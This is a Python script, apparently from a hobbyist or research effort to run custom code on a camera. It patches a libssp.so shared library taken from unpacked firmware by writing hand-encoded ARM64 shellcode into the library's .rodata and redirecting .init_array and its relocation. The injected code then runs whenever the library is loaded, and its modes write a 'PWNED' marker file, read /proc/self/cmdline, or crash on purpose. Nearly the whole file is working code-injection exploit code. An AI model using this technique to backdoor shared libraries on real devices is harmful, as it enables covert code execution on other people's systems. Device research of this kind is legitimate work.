#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
patch_libssp.py — 改造已验证能 dlopen 的 libssp.so，注入我们的代码

为什么这样做（而不是从零构造 ELF）：
    从零构造的 ELF 一律导致 glibc 崩溃，原因是缺 PT_GNU_STACK、
    .init_array 没有 R_AARCH64_RELATIVE 重定位等结构细节。
    与其逐项补齐（每次失败都要插拔相机），不如**借用一个已经在实机上
    验证过能成功 dlopen 的合法外壳**，只做两处最小改动：

      1. 把我们的 ARM64 代码写到 .rodata 区域（在 PT_LOAD[0] 的 R-X 段内）
      2. 把 .init_array[0] 的指针 + 对应 RELATIVE 重定位的 addend
         都改成新代码的地址

原 libssp 的功能我们完全不使用，所以覆盖其 .rodata 字符串没有影响。

libssp 的关键布局（实机已验证 dlopen 成功）：
    PT_LOAD[0]  off=0x0     vaddr=0x0      filesz=0x1474  R-X
    PT_LOAD[1]  off=0x1D90  vaddr=0x11D90  filesz=0x310   RW-
    .rodata     addr=0x1398 off=0x1398    size=0xD8   ← 我们写代码的位置
    .init_array addr=0x11D90 off=0x1D90   size=0x10   ← 改指针的位置
    .rela.dyn   addr=0x7F8  off=0x7F8     size=0x120  ← 改 addend 的位置

用法：
    python patch_libssp.py --mode=ret
    python patch_libssp.py --mode=pwn
"""
import os
import struct
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
SRC = os.path.join(
    HERE, "fw", "out", "firmware.tar_unpacked", "0700_part_image",
    "dev", "nflasha15_unpacked", "lib", "libssp.so.0.0.0",
)
OUTS = {
    "ret": os.path.join(HERE, "payload_patched_ret.so"),
    "pwn": os.path.join(HERE, "payload_patched.so"),
    "log": os.path.join(HERE, "payload_patched_log.so"),
    "crash": os.path.join(HERE, "payload_patched_crash.so"),
    "cmdline": os.path.join(HERE, "payload_patched_cmdline.so"),
}

# ---- 已知布局（由 pyelftools 实测确认）----
CODE_VA = 0x1398          # .rodata 起点，位于 R-X 段内，identity 映射
CODE_OFF = 0x1398
RODATA_END = 0x1470       # R-X 段可用到 0x1474
INIT_ARRAY_VA = 0x11D90
INIT_ARRAY_OFF = 0x1D90
RELA_OFF = 0x7F8
RELA_SIZE = 0x120
R_AARCH64_RELATIVE = 1027

TARGET_PATH = b"/mnt/PRIVATE/PWNED.txt\x00"
MESSAGE = b"PWNED-BY-JIRITSU-V3\n"

NR_OPENAT, NR_CLOSE, NR_WRITE = 56, 57, 64
AT_FDCWD = -100
O_WRONLY_CREAT_TRUNC = 0x241


# ---- 目标模式 ----
# pwn  : 写 SD 卡 /mnt/PRIVATE/PWNED.txt   （外部可观测）
# log  : 写 /tmp/jiritsu/jit.log           （可用 GET_FILE arg1=3 读回，闭环验证）
# crash: 执行 udf #0                        （必然 SIGILL → 用于确认 init_array 是否被调用）
MODES = {
    "pwn": (b"/mnt/PRIVATE/PWNED.txt\x00", b"PWNED-BY-JIRITSU-V4\n"),
    "log": (b"/tmp/jiritsu/jit.log\x00", b"PWNED-JITLOG-V4\n"),
}

O_WRONLY_CREAT_APPEND = 0x441      # 用 O_APPEND，不截断原有日志


# ---------------------------------------------------------------- ARM64 编码
def movn_x(rd, imm16):
    return 0x92800000 | (imm16 << 5) | rd


def movz_x(rd, imm16):
    return 0xD2800000 | (imm16 << 5) | rd


def mov_reg(rd, rm):
    return 0xAA0003E0 | (rm << 16) | rd


def adr_x(rd, imm):
    return ((imm & 3) << 29) | (0x10 << 24) | (((imm >> 2) & 0x7FFFF) << 5) | rd


SVC_0 = 0xD4000001
RET = 0xD65F03C0
UDF_0 = 0x00000000


def sub_sp(imm):
    """sub sp, sp, #imm  (imm 0..4095, lsl 0)"""
    return 0xD1000000 | (imm << 10) | (31 << 5) | 31


def mov_reg_sp(rd):
    """mov Xd, sp —— 注意：不能用 ORR(mov_reg)，因为 ORR 里寄存器号 31 是 XZR。
    ARM64 只能用 ADD Xd, sp, #0 来读 SP。"""
    return 0x91000000 | (31 << 5) | rd


def add_sp(imm):
    """add sp, sp, #imm"""
    return 0x91000000 | (imm << 10) | (31 << 5) | 31


NR_READ = 63


def build_code_cmdline():
    """dump /proc/self/cmdline 的内容追加到 /tmp/jiritsu/jit.log

    用途：确定载荷到底跑在哪个进程里 —— 这决定了能不能访问 appFw 的 .bss。
    输出是原始字节（通常形如 "appFw\\0--xxx\\0"），主机侧直接按 NUL 切分即可。
    """
    cmd_path = b"/proc/self/cmdline\x00"
    log_path = b"/tmp/jiritsu/jit.log\x00"

    n = 25                                   # 指令条数
    cmd_va = CODE_VA + n * 4
    log_va = cmd_va + len(cmd_path)
    end_va = log_va + len(log_path)
    assert end_va <= RODATA_END, "代码+字符串 %d 字节超出 .rodata(%d)" % (
        end_va - CODE_VA, RODATA_END - CODE_VA)

    def adr(pc_idx, target_va):
        return adr_x(1, target_va - (CODE_VA + pc_idx * 4))

    insns = [
        sub_sp(0x40),                        # 0  开栈缓冲
        movn_x(0, (-AT_FDCWD) - 1),          # 1  x0 = -100
        adr(2, cmd_va),                      # 2  x1 = "/proc/self/cmdline"
        movz_x(2, 0),                        # 3  O_RDONLY
        movz_x(8, NR_OPENAT),                # 4
        SVC_0,                               # 5  fd1
        mov_reg(9, 0),                       # 6  x9 = fd1
        mov_reg(0, 9),                       # 7
        mov_reg_sp(1),                       # 8  x1 = sp (缓冲)
        movz_x(2, 64),                       # 9  read 64 字节
        movz_x(8, NR_READ),                  # 10
        SVC_0,                               # 11 x0 = n
        mov_reg(10, 0),                      # 12 x10 = n
        movn_x(0, (-AT_FDCWD) - 1),          # 13
        adr(14, log_va),                     # 14 x1 = "/tmp/jiritsu/jit.log"
        movz_x(2, O_WRONLY_CREAT_APPEND),    # 15 0x441
        movz_x(3, 0o644),                    # 16
        movz_x(8, NR_OPENAT),                # 17
        SVC_0,                               # 18 fd2
        mov_reg_sp(1),                       # 19 x1 = sp
        mov_reg(2, 10),                      # 20 x2 = n
        movz_x(8, NR_WRITE),                 # 21
        SVC_0,                               # 22 write
        add_sp(0x40),                        # 23 收栈
        RET,                                 # 24
    ]
    blob = b"".join(struct.pack("<I", w) for w in insns)
    blob += cmd_path + log_path
    return blob, len(blob)


def build_code(mode):
    """返回 (blob, 长度)"""
    if mode == "ret":
        return struct.pack("<I", RET), 4
    if mode == "crash":
        return struct.pack("<I", UDF_0), 4
    if mode == "cmdline":
        return build_code_cmdline()

    target, message = MODES[mode]
    n = 13
    path_va = CODE_VA + n * 4
    msg_va = path_va + len(target)
    insns = [
        movn_x(0, (-AT_FDCWD) - 1),                       # 0: mov x0, #-100
        adr_x(1, path_va - (CODE_VA + 1 * 4)),            # 1: adr x1, path
        movz_x(2, O_WRONLY_CREAT_APPEND),                 # 2: mov x2, #0x441
        movz_x(3, 0o644),                                 # 3: mov x3, #0644
        movz_x(8, NR_OPENAT),                             # 4: mov x8, #56
        SVC_0,                                            # 5: svc #0
        mov_reg(9, 0),                                    # 6: mov x9, x0  (fd)
        mov_reg(0, 9),                                    # 7: mov x0, x9
        adr_x(1, msg_va - (CODE_VA + 8 * 4)),             # 8: adr x1, msg
        movz_x(2, len(message)),                          # 9: mov x2, #len
        movz_x(8, NR_WRITE),                              # 10: mov x8, #64
        SVC_0,                                            # 11: svc #0
        RET,                                              # 12: ret
    ]
    blob = b"".join(struct.pack("<I", w) for w in insns)
    blob += target + message
    assert CODE_VA + len(blob) <= RODATA_END, \
        "代码 %d 字节超出 .rodata 容量(%d)" % (len(blob), RODATA_END - CODE_VA)
    return blob, len(blob)


def find_init_reloc(data):
    """在 .rela.dyn 里找 r_offset == INIT_ARRAY_VA 的 RELATIVE 重定位"""
    found = []
    for i in range(RELA_SIZE // 24):
        off = RELA_OFF + i * 24
        r_off, r_info, r_add = struct.unpack_from("<QQq", data, off)
        typ = r_info & 0xFFFFFFFF
        if r_off == INIT_ARRAY_VA:
            found.append((off, typ, r_add))
    return found


def main():
    mode = "pwn"
    for a in sys.argv[1:]:
        if a.startswith("--mode="):
            mode = a.split("=", 1)[1]
    if mode not in OUTS:
        sys.exit("--mode 只能是 " + " / ".join(OUTS))

    out = OUTS[mode]

    if not os.path.isfile(SRC):
        sys.exit("找不到 %s" % SRC)

    data = bytearray(open(SRC, "rb").read())
    print("源文件: libssp.so.0.0.0  %d 字节" % len(data))

    # ---- 1. 代码写入 .rodata ----
    code, clen = build_code(mode)
    print("代码:   %d 字节 → va 0x%X (off 0x%X)" % (clen, CODE_VA, CODE_OFF))
    print("        .rodata 可用 %d 字节，剩余 %d 字节"
          % (RODATA_END - CODE_VA, RODATA_END - CODE_VA - clen))
    data[CODE_OFF:CODE_OFF + clen] = code

    # ---- 2. 改 .init_array[0] ----
    old = struct.unpack_from("<Q", data, INIT_ARRAY_OFF)[0]
    struct.pack_into("<Q", data, INIT_ARRAY_OFF, CODE_VA)
    print("init_array[0]: 0x%X -> 0x%X" % (old, CODE_VA))

    # ---- 3. 改对应的 RELATIVE 重定位 addend ----
    rels = find_init_reloc(data)
    if not rels:
        print("⚠ .rela.dyn 里没找到 r_offset=0x%X 的重定位" % INIT_ARRAY_VA)
        print("  （说明 init_array 不需要重定位，只改值即可）")
    for off, typ, add in rels:
        struct.pack_into("<q", data, off + 16, CODE_VA)
        print("reloc @0x%X: type=%d addend 0x%X -> 0x%X"
              % (off, typ, add, CODE_VA))
    print("共修正 %d 处重定位" % len(rels))

    with open(out, "wb") as f:
        f.write(bytes(data))
    print("\n生成: %s  (%d 字节)" % (out, len(data)))

    # ---- 校验 ----
    try:
        from elftools.elf.elffile import ELFFile
        from capstone import Cs, CS_ARCH_ARM64, CS_MODE_ARM
        elf = ELFFile(open(out, "rb"))
        print("\n=== 校验 ===")
        print("  e_type=%s  e_phnum=%d" % (elf["e_type"], elf["e_phnum"]))
        ia = elf.get_section_by_name(".init_array")
        vals = [struct.unpack_from("<Q", ia.data(), k * 8)[0]
                for k in range(ia["sh_size"] // 8)]
        print("  .init_array = %s" % [hex(v) for v in vals])
        md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
        print("  反汇编 @0x%X:" % CODE_VA)
        for k, ins in enumerate(md.disasm(bytes(data[CODE_OFF:CODE_OFF + 64]),
                                          CODE_VA)):
            print("    0x%04X  %-8s %s" % (ins.address, ins.mnemonic, ins.op_str))
            if k >= 15:
                break
    except ImportError:
        pass
    if mode in MODES:
        tgt, msg = MODES[mode]
        print("\n行为: dlopen 时 openat+write → 写 %r = %r"
              % (tgt.rstrip(b"\x00").decode(), msg))
    elif mode == "crash":
        print("\n行为: dlopen 时执行 udf #0（必然 SIGILL，用于确认 init_array 是否被调用）")
    elif mode == "ret":
        print("\n行为: 什么都不做，只验证 ELF 能否被加载")


if __name__ == "__main__":
    main()
